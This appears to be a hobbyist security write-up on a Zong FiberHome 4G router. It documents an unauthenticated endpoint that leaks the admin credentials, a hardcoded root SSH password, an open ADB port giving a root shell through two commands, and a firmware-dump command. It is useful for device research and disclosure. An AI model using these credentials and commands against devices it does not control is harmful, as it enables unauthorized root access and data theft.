
# Zong FiberHome 4G Device

 ## Vulnerabilities and Exploits
 Although the device use a wierd authentication method, it is nothing more than a gimmick used 
 by the UI code to give an illusion of authentication.
 All the endpoints are accessible directly without authentication and the best part of it all is you can
 use the [`admin`](http://192.168.8.1/xml_action.cgi?method=get&module=duster&file=admin) endpoint to get the username and password for the router.

The output of the `admin` endpoint is something like
```
<?xml version="1.0" encoding="US-ASCII"?>
<RGW>
	<management>
		<router_username>admin</router_username>
		<router_password>admin</router_password>
		<web_wlan_enable/>
		<httpd_port/>
		<syslogd_enable/>
		<web_wan_enable/>
		<syslogd_rem_ip/>
		<turbo_mode/>
        <customer/>
	</management>
</RGW>
```

The vulerability explained above is [well know and quite old](https://github.com/OsamaMahmood/Zong-router-exploit) but wait, There's more! to my knowledge(not sure though) the `Fiber Home` version of the `Zong` devices are unlocked by default but if yours is not, you can use a simple trick to get super user access and unlock
the device direcltly from the `Admin Panel` all you have to do is login to your router and change the default **username** from `admin` to `root` and voila you can see a new tab named `Advance` in `Settings` which provides options to unlock the device, As shown below

![Advance Settings](/zong_adv_settings.PNG?raw=true "Advance Settings")

## Analysis
It gets more interesting once you do a portscan of the device. The portscan shows the following ports to be open
 - 22 - SSH
 - 53 - DNS
 - 80 - HTTP (Admin Panel)
 - 3020 - Unknown
 - 3021 - Unknown
 - 5555 - ADB

### Port 22
You can ssh into the device as `root` using password `oelinux123`

### Port 53 and 80
These ports are standard `DNS` and `HTTP` ports

#### Endpoints

Base URL: `/xml_action.cgi?method=get&module=duster&file=[name]`
known file names are:
 - admin
 - app_fun_support_list
 - battery_charge
 - custom_fw
 - detailed_log
 - dns
 - download_local_upgrade
 - lan
 - lock_cell_clear
 - message
 - message_drafts
 - message_outbox
 - message_set
 - message_state
 - message_state
 - net_advace_set
 - ntp_server
 - pin_puk
 - reset
 - restore_defaults
 - shutdown
 - status1
 - time_setting
 - traffic_excess_set
 - uapxb_wlan_basic_settings
 - uapxb_wlan_security_settings
 - upgrade_info
 - ussd_business
 - wan
 - wan_choose_net
 - wan_ip
 - wlan_auto_setting

### Port 3020
Port 3020 is interesting once you connect to it it immediatly send the banner `ms_version:1` and then appears to send/receive nothing but if you keep connected it starts sending packets with `JSON` payloads "periodically" which appears to be 4-byte length prefixed, see the sample payloads below

```
{
	"operate": "report",
	"service_name": "modem",
	"signal_strength": 2
}
```
```
{
	"operate": "report",
	"service_name": "modem",
	"signal_strength_v1": [
		{
			"cdma_dbm": 0,
			"evdo_dbm": -125,
			"gsm_signal_strength": 0,
			"lte_rsrp": -112,
			"operator_type": 2,
			"tds_signal_strength": 0,
			"wcdma_signal_strength": 0
		}
	]
}
```

### Port 3021
This port lets you connect to it and keeps the connection open as long as you don't send anything but as soon as you send something it immediately disconnects, possibly expects somekind of pattern IMO(these kinds of ports were found on other routers too)

### Port 5555
This port runs an unauthenticated `adb daemon` so you can easily connect to it using `adb` and get shell access as follow
```
adb connect 192.168.8.1:5555
adb shell
```
you will get access as root user so you can pretty much do anything you want.

### Dumping Image
You can list the flash partitions using:
```
cat /proc/mtd

Output:

dev:    size   erasesize  name
mtd0: 00140000 00020000 "sbl"
mtd1: 00140000 00020000 "mibib"
mtd2: 00b00000 00020000 "efs2"
mtd3: 00360000 00020000 "sdi"
mtd4: 00360000 00020000 "tz"
mtd5: 000c0000 00020000 "mba"
mtd6: 00360000 00020000 "rpm"
mtd7: 031e0000 00020000 "qdsp"
mtd8: 000e0000 00020000 "appsbl"
mtd9: 00800000 00020000 "apps"
mtd10: 00040000 00020000 "scrub"
mtd11: 04a80000 00020000 "cache"
mtd12: 00160000 00020000 "misc"
mtd13: 00560000 00020000 "cdrom"
mtd14: 002e0000 00020000 "logo"
mtd15: 00800000 00020000 "recovery"
mtd16: 00100000 00020000 "fota"
mtd17: 01080000 00020000 "recoveryfs"
mtd18: 01080000 00020000 "system"
mtd19: 12e80000 00020000 "userdata"
```
you can just `cat` the device and pipe the data to a file e.g. `ssh root@192.168.8.1 "cat /dev/mtd18" > system.img` to get the system image

### Filesystem
Its just a linux filesystem, fun stuff can be found in `/usr/mifi/`. Some of the configurations are also stored in `sqlite 3` databases and can be found in `/usr/data/`

### Credits
Thanks to [IMExperts](https://github.com/IMExperts) for providing the `ssh` password as well as mentioning that port `5555` is running `adb`

